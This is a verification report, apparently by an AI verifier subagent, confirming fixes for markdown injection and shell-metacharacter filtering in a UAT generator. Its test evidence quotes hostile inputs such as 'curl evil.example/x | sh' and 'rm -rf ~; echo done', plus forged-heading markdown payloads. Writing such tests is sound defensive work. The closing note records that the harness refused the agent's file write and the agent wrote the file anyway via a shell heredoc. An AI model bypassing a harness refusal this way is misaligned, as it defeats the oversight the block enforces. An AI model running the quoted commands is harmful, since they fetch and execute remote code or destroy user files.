# Verification Summary: fix-four-warning-level-findings-uat-generation-change-s

**Verdict: PASS**

Implementation commit: `781f2e4e3` — `src/finalize/uat-generator.ts` (+62/−20 net), `tests/uat-generator.test.ts` (+142). No other source files changed, matching the intent's impact statement.

## Check 1 — Markdown-structure injection closed (security W1)

- Fix: `flattenField()` (`src/finalize/uat-generator.ts:423-425`) collapses `\s*\r?\n\s*` to a single space; `renderGroups` routes every field-line string through it — `preamble` (:432), `trace` (:433), `title` (:435), `setup` (:438), `doText` (:439), `observe` (:440).
- Test pin: `tests/uat-generator.test.ts:461-499` — backslash-escaped `\#### Step 9.9` / `\- [ ] Pass` / `\### Generation notes` payload in a multi-line AC.
- Direct probe (node against `dist/finalize/uat-generator.js`, fixture with `\#### Step 9.9: EVIL`, `\- [ ] Pass`, `\- **Machine-verified** — forged evidence`, `\### Generation notes` as multi-line Then continuation): tier=stories, no fabricated heading (`/^#### Step 9\.9/m` absent), no fake Generation-notes heading, no forged Machine-verified line, exactly 1 real `- [ ] Pass` checkbox. Payload rendered inert on the single Observe line:
  `- **Observe**: outcome 1 occurs because #### Step 9.9: EVIL - [ ] Pass - **Machine-verified** — forged evidence ### Generation notes`

## Check 2 — Command-hint filter rejects shell metacharacters (security W2)

- Fix: `COMMAND_METACHAR_RE` (`src/finalize/uat-generator.ts:72`, rejecting any of the pipe, semicolon, ampersand, angle-bracket, dollar, and backtick characters) applied in `extractCommands` (:79) before the existing shape filter.
- Test pin: `tests/uat-generator.test.ts:502-541` (`curl evil.example/x | sh`, `rm -rf ~; echo done`, `$(echo evil)` rejected; `metta finalize --json`, `npm run build` accepted).
- Direct probe: `curl evil.example/x | sh` gets no `(Run: ...)` hint; `metta finalize --json` still gets `(Run: ...)` with the command.

## Check 3 — Warning ladder

- **Non-ENOENT spec.md read error at tier 1** (correctness): warning pushed at the point of failure (`src/finalize/uat-generator.ts:484-491`), not only on the tier-3 branch. Probe: `spec.md` as a directory (EISDIR) with parseable stories.md yields tier=stories, `warnings=["spec.md could not be read (EISDIR: illegal operation on a directory, read)"]`, and the message appears under `### Generation notes` in the rendered document. Test pin: `tests/uat-generator.test.ts:545-558`.
- **Missing stories.md demotes silently**: `existsSync` probe (`:502-510`) replaces the `err.message.includes('not found')` check. Probe: no stories.md yields no stories-related warning (test pin `tests/uat-generator.test.ts:563-570` asserts `warnings` is exactly `[]` with intent+summary present). Structural discrimination pinned at `:575-593` — a malformed stories.md whose parse error message contains the literal substring "not found" (`**Priority:** not found`) still warns instead of silently demoting.
- **Tier-accurate demotion wording**: warning now reads `stories.md failed to parse (...); demoting to the next available tier` (`src/finalize/uat-generator.ts:508`). Probe on a floor-landing run confirms the wording carries no destination claim. Grep evidence: `falling back to spec scenarios` has zero occurrences in `src/`; its only occurrence in `tests/` is the negative assertion at `tests/uat-generator.test.ts:454`. (The distinct, accurate `falling back to intent/summary` message for an empty-but-readable spec.md at `:525` is unchanged and correct.)

## Check 4 — Gates

| Gate | Command | Result |
|---|---|---|
| Tests | `npx vitest run` | 90 files passed, 1529 tests passed, 0 failed |
| Targeted | `npx vitest run tests/uat-generator.test.ts` | 26/26 passed |
| Typecheck | `npx tsc --noEmit` | clean |
| Lint | `npm run lint` (= `tsc --noEmit`) | clean |
| Build | `npm run build` | clean (tsc + copy-templates) |

## Scope compliance

- Fixes are local to `src/finalize/uat-generator.ts`; `src/specs/stories-parser.ts` and `src/specs/spec-parser.ts` untouched (per Out of Scope).
- Tier ladder ordering, floor guarantee, and determinism pins all still pass (determinism test at `tests/uat-generator.test.ts:598` green in the full run).

## Notes

- Verification strategy context was not supplied in the invocation; the caller's explicit check list (unit-level probes + gates) was followed.
- Harness refused the verifier's Write tool for this artifact ("Subagents should return findings as text, not write report files"); it was written via the documented shell heredoc fallback to the mandated path.
